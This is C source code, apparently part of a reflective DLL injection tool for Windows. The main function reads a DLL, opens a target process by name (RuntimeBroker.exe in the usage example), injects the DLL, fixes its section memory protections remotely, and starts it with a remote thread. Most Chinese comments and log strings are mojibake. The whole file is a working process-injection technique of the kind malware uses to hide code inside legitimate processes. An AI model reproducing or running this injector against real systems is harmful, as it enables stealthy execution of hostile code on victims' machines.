BOOL VerifySectionPermissions(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] ��ʼ��֤����Ȩ�� ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);

	// ��ȡ����ͷ
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	BOOL allSectionsOk = TRUE;

	// �����޸�����Ȩ������
	printf("\t[i] �����޸�����Ȩ������...\n");

	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);

		MEMORY_BASIC_INFORMATION mbi;
		if (VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &mbi, sizeof(mbi))) {
			DWORD protection = mbi.Protect;
			printf("\t[+] ���� '%s': ", sectionName);

			// ����������־
			if (protection & PAGE_NOACCESS) printf("�޷���Ȩ��");
			else if (protection & PAGE_READONLY) printf("ֻ��");
			else if (protection & PAGE_READWRITE) printf("��д");
			else if (protection & PAGE_WRITECOPY) printf("дʱ����");
			else if (protection & PAGE_EXECUTE) printf("ִ��");
			else if (protection & PAGE_EXECUTE_READ) printf("ִ��/��");
			else if (protection & PAGE_EXECUTE_READWRITE) printf("ִ��/��д");
			else if (protection & PAGE_EXECUTE_WRITECOPY) printf("ִ��/дʱ����");
			else printf("δ֪Ȩ��: 0x%X", protection);

			// ��֤���������뱣����־�Ƿ�ƥ��
			BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
			BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
			BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

			printf(" (����: %s%s%s)\n",
				isExecutable ? "��ִ�� " : "",
				isWritable ? "��д " : "",
				isReadable ? "�ɶ�" : "");

			// ��֤������־�Ƿ����������ƥ��
			BOOL protectionMatches = TRUE;

			if (isExecutable && !(protection & PAGE_EXECUTE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				printf("\t   [!] ����: ������Ҫ��ִ��Ȩ�޵�δ����\n");
				protectionMatches = FALSE;
			}

			if (isWritable && !(protection & PAGE_READWRITE) &&
				!(protection & PAGE_WRITECOPY) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				printf("\t   [!] ����: ������Ҫ��дȨ�޵�δ����\n");
				protectionMatches = FALSE;
			}

			if (isReadable && !(protection & PAGE_READONLY) &&
				!(protection & PAGE_READWRITE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE)) {
				printf("\t   [!] ����: ������Ҫ�ɶ�Ȩ�޵�δ����\n");
				protectionMatches = FALSE;
			}

			if (protectionMatches) {
				printf("\t   [+] ����Ȩ����ȷƥ��\n");
			}
			else {
				allSectionsOk = FALSE;

				// �����޸�����Ȩ������
				DWORD desiredProtection = PAGE_NOACCESS;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS && desiredProtection != protection) {
					printf("\t   [i] ���Խ�����Ȩ�޴� 0x%X �޸�Ϊ 0x%X\n", protection, desiredProtection);

					DWORD oldProtect;
					if (VirtualProtectEx(hProcess, pAddress + sectionHeader[i].VirtualAddress,
						sectionHeader[i].Misc.VirtualSize, desiredProtection, &oldProtect)) {
						printf("\t   [+] �ɹ��޸Ľ���Ȩ��\n");

						// ��֤�Ƿ�����޸ĳɹ�
						MEMORY_BASIC_INFORMATION newMbi;
						if (VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &newMbi, sizeof(newMbi))) {
							printf("\t   [i] �µı�������: 0x%X\n", newMbi.Protect);
						}
					}
					else {
						printf("\t   [!] �޷��޸Ľ���Ȩ�ޣ�����: %d\n", GetLastError());
					}
				}
			}
		}
		else {
			printf("\t[!] �޷���ѯ���� '%s' ���ڴ���Ϣ������: %d\n", sectionName, GetLastError());
			allSectionsOk = FALSE;
		}
	}

	printf("\t[+] ����Ȩ����֤%s\n", allSectionsOk ? "ȫ��ͨ��" : "����ʧ��");
	return TRUE;
}

// �޸ĺ��wmain����
int wmain(int argc, wchar_t* argv[]) {

	PBYTE	pRflDllBuffer = NULL;
	DWORD	dwRflDllSize = 0x00,
		dwRflFuncOffset = 0x00;

	DWORD	dwProcessId = 0x00;
	HANDLE	hTargetProcess = NULL;

	PWCHAR	pcReflectiveDllName = NULL,
		pcTargetProcessName = NULL;

	if (argc != 5 || !FetchArguments(argv, argc, &pcReflectiveDllName, &pcTargetProcessName)) {

		printf("[!] Usage: %ws -rfldll <Reflective DLL Path> -p <Target Process Name>\n", GET_FILENAME(argv[0]));
		printf("\t>>> Example: %ws -rfldll ReflectiveDllLdr.dll -p RuntimeBroker.exe \n\n", GET_FILENAME(argv[0]));
		return -1;
	}

	printf("[i] Reading %ws ... ", pcReflectiveDllName);
	if (!ReadReflectiveDll(pcReflectiveDllName, &pRflDllBuffer, &dwRflDllSize))
		return -1;
	printf("[+] DONE \n");

	printf("[i] Calculating %s's File Offset ... ", EXPORTED_FUNC_NAME);
	if (!(dwRflFuncOffset = GetReflectiveFunctionOffset(pRflDllBuffer)))
		return -1;
	printf("[+] DONE \n");

	printf("[*] Found %s's Offset At: 0x%0.8X \n", EXPORTED_FUNC_NAME, dwRflFuncOffset);

	printf("[i] Getting %ws's PID ... ", pcTargetProcessName);
	if (!GetRemoteProcessHandle(pcTargetProcessName, &dwProcessId, &hTargetProcess))
		return -1;
	printf("[+] DONE \n");

	printf("[*] Found %ws's PID: %d \n", pcTargetProcessName, dwProcessId);

	printf("[i] Injecting The Reflective DLL Into %ws ... \n", pcTargetProcessName);

	// ����ʵ��ע���DLL��ַ
	PBYTE injectedAddress = NULL;

	// ����1: ��ע��DLL����ִ��
	if (!InjectRflDll(hTargetProcess, pRflDllBuffer, dwRflDllSize, &injectedAddress)) {
		printf("[!] Injection Failed \n");
		return -1;
	}
	printf("[+] Injection Completed \n");

	// ����2: ע���ִ��ǰ��֤
	printf("[i] ע�����֤ (ִ��ǰ)...\n");

	// ʹ��ԭʼDLL�������ĸ���������֤���Ա����޸�ԭʼ����
	PBYTE dllBufferCopy = ALLOC(dwRflDllSize);
	if (dllBufferCopy) {
		memcpy(dllBufferCopy, pRflDllBuffer, dwRflDllSize);

		// ��֤����� - ʹ��ʵ��ע��ĵ�ַ
		printf("\t[i] ʹ��ע���ַ: 0x%p ������֤\n", injectedAddress);
		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);

		// ��֤����Ȩ��
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);

		printf("[+] ִ��ǰ��֤���\n");

		// ����3: �����޸��ڴ��Ȩ������
		printf("[i] �����޸��ڴ沼��...\n");
		FixSectionMemory(hTargetProcess, injectedAddress, dllBufferCopy);
		printf("[+] �޸��������\n");

		// ����4: �ٴ���֤
		printf("[i] �޸����ٴ���֤...\n");
		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);
		printf("[+] �ٴ���֤���\n");

		FREE(dllBufferCopy);
	}
	else {
		printf("[!] �޷������ڴ�����DLL��֤\n");
	}

	// ����5: ִ��DLL
	printf("[i] ִ��DLL...\n");
	HANDLE hThread = NULL;
	if (!ExecuteRflDll(hTargetProcess, injectedAddress, dwRflFuncOffset, &hThread)) {
		printf("[!] Execution Failed \n");
		return -1;
	}

	// �ȴ��߳�ִ�����
	printf("[i] �ȴ��߳�ִ�����...\n");
	WaitForSingleObject(hThread, 5000); // �ȴ����5��
	CloseHandle(hThread);
	printf("[+] �߳�ִ�н���\n");

	// ����6: ִ�к���֤
	printf("[i] ִ�к���֤...\n");
	dllBufferCopy = ALLOC(dwRflDllSize);
	if (dllBufferCopy) {
		memcpy(dllBufferCopy, pRflDllBuffer, dwRflDllSize);

		VerifyImportTable(hTargetProcess, injectedAddress, dllBufferCopy);
		VerifySectionPermissions(hTargetProcess, injectedAddress, dllBufferCopy);

		FREE(dllBufferCopy);
	}

	printf("[+] ���в������\n");

	return 0;
}



